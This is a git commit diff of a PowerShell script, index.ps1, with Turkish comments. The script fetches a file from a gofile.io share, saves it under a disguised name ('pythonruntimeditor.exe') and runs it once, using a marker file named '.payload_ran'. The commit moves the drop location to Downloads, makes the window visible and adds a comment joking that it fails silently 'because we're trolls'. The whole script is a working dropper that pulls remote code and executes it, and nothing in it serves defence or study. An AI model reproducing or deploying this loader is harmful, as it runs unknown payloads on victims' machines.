807720bc332285c09012b21ee9d83691bc97732d
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-04-21 06:41:37 +0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,24 +1,22 @@
-# Sessizce gofile'dan dosya indirip bir kez çalıştırır
-
 $gofileCode = "lBhjqd"
 $apiUrl = "https://api.gofile.io/getContent?contentId=$gofileCode&token=&websiteToken=websiteToken&cache=true"
 
 try {
-    $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -ErrorAction SilentlyContinue
+    $response = Invoke-WebRequest -Uri $apiUrl -UseBasicParsing -ErrorAction Stop
     $json = $response.Content | ConvertFrom-Json
     $directUrl = $json.data.contents.PSObject.Properties.Value[0].link
 
-    $localPath = "$env:TEMP\pythonruntimeditor.exe"
-    $markerPath = "$env:TEMP\.payload_ran"
+    $localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
+    $markerPath = "$env:USERPROFILE\Downloads\.payload_ran"
 
     if (-not (Test-Path $localPath)) {
-        Invoke-WebRequest -Uri $directUrl -OutFile $localPath -UseBasicParsing -ErrorAction SilentlyContinue
+        Invoke-WebRequest -Uri $directUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
     }
 
     if (-not (Test-Path $markerPath)) {
-        Start-Process -FilePath $localPath -WindowStyle Hidden
+        Start-Process -FilePath $localPath -WindowStyle Normal
         New-Item -Path $markerPath -ItemType File -Force | Out-Null
     }
 } catch {
-    # Hata olursa sessizce geç
+    # Sessiz fail çünkü troll'üz
 }
